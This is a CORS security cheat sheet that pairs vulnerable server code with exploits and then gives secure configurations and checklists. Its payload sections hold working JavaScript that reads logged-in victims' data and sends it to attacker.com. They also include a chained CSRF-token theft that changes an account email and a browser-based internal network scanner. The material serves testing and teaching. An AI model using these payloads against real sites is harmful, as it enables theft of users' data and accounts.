# CORS (Cross-Origin Resource Sharing) - Cheat Sheet

## 🎯 CORS Headers Reference

### Request Headers

| Header | Description | Example | Set By |
|--------|-------------|---------|--------|
| `Origin` | Source of the request | `Origin: https://attacker.com` | Browser (cannot be spoofed) |
| `Access-Control-Request-Method` | Method for preflight | `Access-Control-Request-Method: DELETE` | Browser (preflight) |
| `Access-Control-Request-Headers` | Headers for preflight | `Access-Control-Request-Headers: X-Custom` | Browser (preflight) |

### Response Headers

| Header | Description | Example | Vulnerable When |
|--------|-------------|---------|-----------------|
| `Access-Control-Allow-Origin` | Allowed origin(s) | `Access-Control-Allow-Origin: https://attacker.com` | Reflects arbitrary origins |
| `Access-Control-Allow-Credentials` | Allow cookies/auth | `Access-Control-Allow-Credentials: true` | Combined with reflected origin |
| `Access-Control-Allow-Methods` | Allowed HTTP methods | `Access-Control-Allow-Methods: GET, POST, DELETE` | Over-permissive (DELETE, PUT) |
| `Access-Control-Allow-Headers` | Allowed headers | `Access-Control-Allow-Headers: *` | Wildcard allows any header |
| `Access-Control-Expose-Headers` | Headers JS can access | `Access-Control-Expose-Headers: X-API-Key` | Exposes sensitive headers |
| `Access-Control-Max-Age` | Preflight cache time | `Access-Control-Max-Age: 86400` | Long cache = harder to fix |
| `Vary` | Cache control | `Vary: Origin` | Missing = cache poisoning risk |

---

## 🔥 Vulnerability Patterns

### Pattern 1: Arbitrary Origin Reflection

**Vulnerable Code:**
```javascript
// Node.js
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    next();
});
```

**Exploit:**
```html
<script>
fetch('https://victim.com/api/data', {
    credentials: 'include'
}).then(r => r.text()).then(data => {
    fetch('https://attacker.com/log?data=' + btoa(data));
});
</script>
```

---

### Pattern 2: Null Origin Trusted

**Vulnerable Code:**
```python
# Python Flask
@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin')
    if origin == 'null':
        response.headers['Access-Control-Allow-Origin'] = 'null'
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

**Exploit:**
```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="<script>
fetch('https://victim.com/api/data', {
    credentials: 'include'
}).then(r => r.text()).then(data => {
    top.location = 'https://attacker.com/log?data=' + encodeURIComponent(data);
});
</script>"></iframe>
```

---

### Pattern 3: Regex Bypass (Missing Anchors)

**Vulnerable Code:**
```php
// PHP
$origin = $_SERVER['HTTP_ORIGIN'];
if (preg_match('/victim\.com/', $origin)) {
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Credentials: true");
}
```

**Bypass:**
```
https://victim.com.attacker.com
https://attackervictim.com
https://victimXcom.attacker.com
```

**Secure Regex:**
```php
if (preg_match('/^https:\/\/[\w-]+\.victim\.com$/', $origin)) {
    // Properly anchored with ^ and $
    // Protocol specified (https only)
    // Escaped dot (\.)
}
```

---

### Pattern 4: Protocol Confusion

**Vulnerable Code:**
```javascript
// Trusts subdomain regardless of protocol
if (origin.match(/^https?:\/\/.*\.victim\.com$/)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
}
```

**Exploit Chain:**
1. Find XSS on `http://subdomain.victim.com`
2. Inject CORS payload
3. Make request to `https://victim.com` (trusted)

---

### Pattern 5: Wildcard with Alternative Auth

**Vulnerable Code:**
```javascript
// Wildcard CORS
res.setHeader('Access-Control-Allow-Origin', '*');

// Auth via custom header or URL param (not cookies)
// e.g., ?api_key=secret or X-API-Key header
```

**Exploit:**
```javascript
// Steal API key from URL or extract from page
fetch('https://victim.com/api/data?api_key=STOLEN_KEY')
    .then(r => r.text())
    .then(data => fetch('https://attacker.com/exfil?data=' + btoa(data)));
```

---

### Pattern 6: Internal Network Trust

**Vulnerable Code:**
```javascript
// Trust all internal IPs
if (origin.match(/^https?:\/\/(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)/)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
}
```

**Exploit:**
Victim's browser scans internal network and makes requests from inside firewall.

---

## 🎯 Exploitation Payloads

### Basic XMLHttpRequest

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'https://victim.com/api/data', true);
req.withCredentials = true;
req.onload = function() {
    if (this.status === 200) {
        // Exfiltrate data
        fetch('https://attacker.com/log?data=' + btoa(this.responseText));
    }
};
req.onerror = function() {
    console.log('CORS blocked');
};
req.send();
```

### Fetch API (Modern)

```javascript
fetch('https://victim.com/api/data', {
    method: 'GET',
    credentials: 'include',  // Include cookies
    mode: 'cors'
})
.then(response => response.text())
.then(data => {
    // Exfiltrate
    navigator.sendBeacon('https://attacker.com/log', data);
})
.catch(err => console.log('CORS error:', err));
```

### POST Request

```javascript
fetch('https://victim.com/api/action', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        action: 'malicious',
        param: 'value'
    })
})
.then(r => r.text())
.then(data => fetch('https://attacker.com/log?response=' + btoa(data)));
```

### Multi-Step Attack

```javascript
// Step 1: Get CSRF token
fetch('https://victim.com/account', {
    credentials: 'include'
})
.then(r => r.text())
.then(html => {
    // Step 2: Extract token
    const token = html.match(/name="csrf" value="([^"]+)"/)[1];

    // Step 3: Perform action with token
    const formData = new FormData();
    formData.append('csrf', token);
    formData.append('email', 'attacker@evil.com');

    return fetch('https://victim.com/account/change-email', {
        method: 'POST',
        credentials: 'include',
        body: formData
    });
})
.then(() => fetch('https://attacker.com/log?success=true'));
```

### Null Origin (Sandboxed Iframe)

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc="<script>
fetch('https://victim.com/api/data', {
    credentials: 'include'
})
.then(r => r.text())
.then(data => {
    top.location = 'https://attacker.com/log?data=' + encodeURIComponent(data);
});
</script>"></iframe>
```

### Network Scanner (Internal Pivot)

```javascript
// Scan internal network
const results = [];

for (let i = 1; i <= 254; i++) {
    const ip = `192.168.0.${i}`;

    fetch(`http://${ip}:8080/`, {
        mode: 'no-cors',
        signal: AbortSignal.timeout(1000)
    })
    .then(() => {
        results.push(ip);
        console.log('Found:', ip);
    })
    .catch(() => {}); // Ignore failures
}

setTimeout(() => {
    // Exfiltrate discovered hosts
    fetch('https://attacker.com/scan-results?ips=' + results.join(','));
}, 5000);
```

---

## 🧪 Testing Commands

### cURL Testing

```bash
# Basic test - arbitrary origin
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=abc123" \
     -i https://victim.com/api/data

# Null origin test
curl -H "Origin: null" \
     -H "Cookie: session=abc123" \
     -i https://victim.com/api/data

# Protocol downgrade test
curl -H "Origin: http://victim.com" \
     -H "Cookie: session=abc123" \
     -i https://victim.com/api/data

# Subdomain test
curl -H "Origin: https://evil.victim.com" \
     -H "Cookie: session=abc123" \
     -i https://victim.com/api/data

# With preflight (OPTIONS)
curl -X OPTIONS \
     -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: DELETE" \
     -H "Access-Control-Request-Headers: X-Custom-Header" \
     -i https://victim.com/api/data
```

### Burp Suite Intruder

**Position:**
```http
GET /api/data HTTP/1.1
Host: victim.com
Origin: §https://test.com§
Cookie: session=abc123
```

**Payloads:**
```
null
https://victim.com
http://victim.com
https://evil.com
https://victim.com.evil.com
https://evil-victim.com
https://subdomain.victim.com
https://victi.com
https://victimXcom
file://victim.com
```

**Grep - Extract:**
```
Access-Control-Allow-Origin: (.*)
Access-Control-Allow-Credentials: (.*)
```

---

## 🔍 Burp Suite Extensions

### CORS* (Additional CORS Checks)

**Features:**
- Automatic origin reflection testing
- Regex bypass detection
- Null origin testing
- Protocol confusion checks

**Installation:**
```
Extender → BApp Store → "CORS*, Additional CORS Checks" → Install
```

**Usage:**
- Automatically tests each proxied request
- Generates issues in Dashboard
- Includes proof-of-concept exploits

### Trusted Domain CORS Scanner

**Features:**
- URL validation bypass checks
- Subdomain enumeration
- PortSwigger bypass techniques
- Detailed reporting

**Installation:**
```
Extender → BApp Store → "Trusted Domain CORS Scanner" → Install
```

---

## 🛠️ Standalone Tools

### Corsy

```bash
# Installation
git clone https://github.com/s0md3v/Corsy.git
cd Corsy
pip3 install -r requirements.txt

# Usage
python3 corsy.py -u https://victim.com

# With cookies
python3 corsy.py -u https://victim.com -c "session=abc123"

# From file
python3 corsy.py -i urls.txt

# Custom origin
python3 corsy.py -u https://victim.com -o https://evil.com
```

### CORScanner

```bash
# Installation
git clone https://github.com/chenjj/CORScanner.git
cd CORScanner
pip3 install -r requirements.txt

# Basic scan
python3 cors_scan.py -u https://victim.com

# Deep scan with threads
python3 cors_scan.py -u https://victim.com -d -t 20

# From file
python3 cors_scan.py -i urls.txt -o results.json
```

### CorsMe

```bash
# Installation
git clone https://github.com/Shivangx01b/CorsMe.git
cd CorsMe
pip3 install -r requirements.txt

# Scan
python3 corsme.py -u https://victim.com

# With headers
python3 corsme.py -u https://victim.com -H "Cookie: session=abc"
```

---

## 📊 Vulnerability Classification

### CVSS v3.1 Scoring

**Base Score: 8.1 - 9.3 (HIGH to CRITICAL)**

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`

**Breakdown:**
- **Attack Vector (AV:N)**: Network - exploitable remotely
- **Attack Complexity (AC:L)**: Low - no special conditions
- **Privileges Required (PR:N)**: None - attacker needs no privileges
- **User Interaction (UI:R)**: Required - victim must visit attacker page
- **Scope (S:C)**: Changed - affects resources beyond vulnerable component
- **Confidentiality (C:H)**: High - total information disclosure
- **Integrity (I:H)**: High - can modify data/perform actions
- **Availability (A:N)**: None - typically doesn't affect availability

### CWE Mapping

- **CWE-942**: Overly Permissive Cross-domain Whitelist
- **CWE-346**: Origin Validation Error
- **CWE-639**: Authorization Bypass Through User-Controlled Key
- **CWE-284**: Improper Access Control

### OWASP Top 10

- **A05:2021 – Security Misconfiguration**
- **A07:2021 – Identification and Authentication Failures** (indirect)
- **A01:2021 – Broken Access Control** (indirect)

### MITRE ATT&CK

- **T1189**: Drive-by Compromise
- **T1071**: Application Layer Protocol
- **T1539**: Steal Web Session Cookie
- **T1567**: Exfiltration Over Web Service

---

## 🎭 Attack Scenarios

### Scenario 1: API Key Theft

**Target:** SaaS application with API keys in user profile

**Attack Flow:**
1. Attacker discovers `/api/user/profile` returns API key
2. Tests CORS with `Origin: https://evil.com` → Reflected
3. Creates phishing page with CORS exploit
4. Victim visits attacker's page while logged into SaaS app
5. JavaScript steals API key via CORS
6. Attacker uses API key to access victim's data

**Impact:** Complete account compromise

---

### Scenario 2: Banking Transaction

**Target:** Online banking with CORS misconfiguration

**Attack Flow:**
1. Attacker finds `/api/transfer` endpoint vulnerable to CORS
2. Creates malicious page with transfer request
3. Victim browses to attacker's page while logged into bank
4. CORS allows reading CSRF token from bank's HTML
5. JavaScript submits transfer with valid CSRF token
6. Money transferred to attacker's account

**Impact:** Financial fraud

---

### Scenario 3: Admin Panel Access

**Target:** Internal admin panel accessible via CORS

**Attack Flow:**
1. Company intranet has admin panel on `http://admin.internal:8080`
2. Admin panel trusts all internal origins via CORS
3. Attacker tricks employee to visit malicious external site
4. JavaScript scans internal network from employee's browser
5. Discovers admin panel, injects XSS via vulnerable parameter
6. XSS payload uses CORS to access admin functions
7. Attacker deletes users, modifies data, escalates privileges

**Impact:** Full internal network compromise

---

### Scenario 4: OAuth Token Theft

**Target:** OAuth provider with CORS on token endpoint

**Attack Flow:**
1. OAuth provider's `/oauth/token` endpoint has CORS misconfiguration
2. Attacker discovers token endpoint returns access tokens
3. Victim authorizes attacker's fake app
4. Attacker's app uses CORS to steal victim's access token
5. Token used to access victim's data across multiple services

**Impact:** Cross-service account compromise

---

## 🛡️ Secure Implementation

### Node.js (Express)

```javascript
const express = require('express');
const app = express();

// Secure CORS configuration
const allowedOrigins = [
    'https://trusted-domain.com',
    'https://app.trusted-domain.com'
];

app.use((req, res, next) => {
    const origin = req.headers.origin;

    // Strict origin validation
    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
        res.setHeader('Access-Control-Max-Age', '600'); // 10 minutes
        res.setHeader('Vary', 'Origin'); // Prevent cache poisoning
    }

    // Handle preflight
    if (req.method === 'OPTIONS') {
        return res.sendStatus(204);
    }

    next();
});

// Using cors middleware (alternative)
const cors = require('cors');

const corsOptions = {
    origin: function (origin, callback) {
        if (allowedOrigins.indexOf(origin) !== -1 || !origin) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true,
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    maxAge: 600
};

app.use(cors(corsOptions));
```

### Python (Flask)

```python
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)

# Secure CORS configuration
allowed_origins = [
    'https://trusted-domain.com',
    'https://app.trusted-domain.com'
]

def is_origin_allowed(origin):
    """Strict origin validation"""
    if not origin:
        return False

    # Explicit whitelist check
    if origin in allowed_origins:
        return True

    # Pattern matching with security (if needed)
    import re
    pattern = r'^https://[\w-]+\.trusted-domain\.com$'
    if re.match(pattern, origin):
        return True

    return False

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')

    if is_origin_allowed(origin):
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        response.headers['Access-Control-Max-Age'] = '600'
        response.headers['Vary'] = 'Origin'

    return response

# Using Flask-CORS extension (alternative)
CORS(app,
     origins=allowed_origins,
     supports_credentials=True,
     methods=['GET', 'POST'],
     allow_headers=['Content-Type', 'Authorization'],
     max_age=600)
```

### PHP

```php
<?php
// Secure CORS configuration
$allowed_origins = [
    'https://trusted-domain.com',
    'https://app.trusted-domain.com'
];

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

// Strict validation
if (in_array($origin, $allowed_origins, true)) {
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Allow-Methods: GET, POST");
    header("Access-Control-Allow-Headers: Content-Type, Authorization");
    header("Access-Control-Max-Age: 600");
    header("Vary: Origin");
}

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit();
}

// Regex validation (if pattern matching needed)
function is_origin_allowed($origin) {
    // Explicit whitelist
    $allowed = ['https://trusted-domain.com'];
    if (in_array($origin, $allowed, true)) {
        return true;
    }

    // Pattern matching with anchors
    if (preg_match('/^https:\/\/[\w-]+\.trusted-domain\.com$/', $origin)) {
        return true;
    }

    return false;
}
?>
```

### Java (Spring Boot)

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.filter.CorsFilter;

import java.util.Arrays;

@Configuration
public class CorsConfig {

    @Bean
    public CorsFilter corsFilter() {
        CorsConfiguration config = new CorsConfiguration();

        // Explicit whitelist
        config.setAllowedOrigins(Arrays.asList(
            "https://trusted-domain.com",
            "https://app.trusted-domain.com"
        ));

        // Allow credentials
        config.setAllowCredentials(true);

        // Allowed methods
        config.setAllowedMethods(Arrays.asList("GET", "POST"));

        // Allowed headers
        config.setAllowedHeaders(Arrays.asList("Content-Type", "Authorization"));

        // Cache preflight
        config.setMaxAge(600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);

        return new CorsFilter(source);
    }
}
```

---

## ✅ Security Checklist

### Configuration Review

- [ ] **No wildcard (`*`) with credentials**
- [ ] **Explicit origin whitelist** (no reflection)
- [ ] **Regex uses anchors** (`^` and `$`)
- [ ] **Protocol validation** (HTTPS only)
- [ ] **Escaped special characters** in regex (`.` → `\.`)
- [ ] **Never trust `null` origin** in production
- [ ] **`Vary: Origin` header** present for caching
- [ ] **Minimal allowed methods** (no DELETE/PUT unless needed)
- [ ] **Short `Max-Age`** for preflight (600-3600 seconds)
- [ ] **Review subdomain trust** carefully
- [ ] **Internal network origins** not blindly trusted

### Testing Checklist

- [ ] Test with arbitrary origin (`https://evil.com`)
- [ ] Test with null origin
- [ ] Test with protocol variations (HTTP/HTTPS)
- [ ] Test with subdomain prefix/suffix
- [ ] Test with character substitution (`.` → any char)
- [ ] Test preflight OPTIONS requests
- [ ] Verify `Access-Control-Allow-Credentials`
- [ ] Check for cache poisoning (`Vary` header)
- [ ] Test with special characters/Unicode in origin
- [ ] Verify sensitive data not exposed

### Remediation Priority

**P0 - Critical (Fix Immediately):**
- Arbitrary origin reflection with credentials
- Null origin trusted in production
- Sensitive data exposed (passwords, tokens, PII)

**P1 - High (Fix Within Week):**
- Regex bypass allowing untrusted origins
- Protocol confusion (HTTP subdomain trusted)
- Internal network trust without authentication

**P2 - Medium (Fix Within Month):**
- Over-permissive methods (DELETE, PUT)
- Missing `Vary: Origin` header
- Long `Max-Age` on sensitive endpoints

**P3 - Low (Fix When Possible):**
- Over-verbose error messages
- Missing rate limiting on CORS endpoints
- Lack of monitoring/logging

---

## 📚 Additional Resources

### Documentation
- [MDN - CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [W3C Fetch Standard](https://fetch.spec.whatwg.org/)
- [RFC 6454 - The Web Origin Concept](https://tools.ietf.org/html/rfc6454)

### Testing Guides
- [PortSwigger CORS Labs](https://portswigger.net/web-security/cors)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackerOne Disclosed Reports](https://hackerone.com/hacktivity?querystring=cors)

### Tools
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Corsy Scanner](https://github.com/s0md3v/Corsy)
- [CORScanner](https://github.com/chenjj/CORScanner)

---

**Last Updated:** 2024
**Version:** 1.0
**License:** Educational Use Only

---

*For complete lab walkthroughs, see `cors-portswigger-labs-complete.md`*
*For quick exploitation guide, see `cors-quickstart.md`*
